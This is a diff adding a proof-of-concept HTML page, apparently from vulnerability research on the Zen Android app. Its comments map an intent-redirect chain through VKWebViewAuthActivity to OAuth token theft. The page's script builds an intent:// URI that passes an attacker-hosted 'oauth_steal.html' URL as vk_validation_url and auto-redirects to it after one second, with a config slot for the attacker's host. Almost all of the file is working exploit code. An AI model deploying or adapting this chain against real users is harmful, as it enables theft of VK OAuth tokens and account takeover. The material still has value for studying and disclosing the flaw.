@@ -1,0 +1,72 @@
+<!doctype html>
+<!--
+  Zen intent-redirect PoC — VKWebViewAuthActivity chain (Finding #2A).
+
+  Loaded inside Zen's in-app browser (no JS bridge here).
+  Redirects via intent:// to non-exported VKWebViewAuthActivity,
+  passing vk_validation_url = attacker-hosted oauth_steal.html.
+
+  VKWebViewAuthActivity creates a WebView with JS enabled and loads
+  the attacker URL directly — no URL validation on vk_validation_url.
+  The WebView shares VK cookies with the rest of the app.
+
+  Chain: deeplink/PoC → ZenDeeplinkActivity → browser WebView loads this page
+  → intent:// redirect → VKWebViewAuthActivity(vk_validation_url=oauth_steal.html)
+  → WebView + JS + VK cookies → OAuth token theft / phishing
+
+  Caller chain (source references):
+    gF0/u.java:64  Intent.parseUri(uri, 1) — preserves component+extras
+    VKWebViewAuthActivity.java:335  getStringExtra("vk_validation_url")
+    VKWebViewAuthActivity.java:332  setJavaScriptEnabled(true)
+    VKWebViewAuthActivity.java:352  loadUrl(vk_validation_url)
+
+  Previous vectors:
+    a.html            — VkBrowserActivity + AndroidBridge (token theft via bridge)
+    a_fileprovider.html — FileProvider FLAG_GRANT_READ (refuted API 29+)
+-->
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Zen PoC — VKWebViewAuthActivity chain</title>
+</head>
+<body style="font-family:sans-serif;font-size:15px;padding:20px;line-height:1.6">
+<h2>Finding #2A — VKWebViewAuthActivity + OAuth Theft</h2>
+<pre id="out" style="white-space:pre-wrap;word-break:break-word;background:#f5f5f5;padding:16px;border-radius:8px;font-size:13px">preparing redirect…</pre>
+<p><a id="manual" href="#">[manual trigger]</a></p>
+<script>
+(function() {
+  var out = document.getElementById('out');
+  function log(s) { out.textContent += "\n" + s; }
+  out.textContent = "origin: " + location.origin;
+  log("href:   " + location.href);
+
+  // ---- CONFIG ----
+  // Set your raw.githack.com base URL here.
+  // Format: https://raw.githack.com/{USER}/{REPO}/{BRANCH}/results/pocs/zen_intent_redirect/web/
+  var GITHACK_BASE = 'https://raw.githack.com/user/repo/master/results/pocs/zen_intent_redirect/web/';
+  // ---- END CONFIG ----
+
+  var stealUrl = GITHACK_BASE + 'oauth_steal.html';
+  log("exploit page: " + stealUrl);
+
+  // intent:// URI targeting non-exported VKWebViewAuthActivity (same uid = OK).
+  // S.vk_validation_url = attacker page loaded in WebView with JS + VK cookies.
+  // No validation on this String extra — loads any URL.
+  var intentUri = 'intent://x#Intent;'
+    + 'component=ru.zen.android/com.vk.api.sdk.ui.VKWebViewAuthActivity;'
+    + 'S.vk_validation_url=' + stealUrl + ';'
+    + 'end';
+
+  log("\nintent URI:");
+  log(intentUri);
+
+  document.getElementById('manual').href = intentUri;
+
+  log("\nauto-redirect in 1 s …");
+  setTimeout(function() {
+    log(">>> redirecting now");
+    location.href = intentUri;
+  }, 1000);
+})();
+</script>
+</body>
+</html>
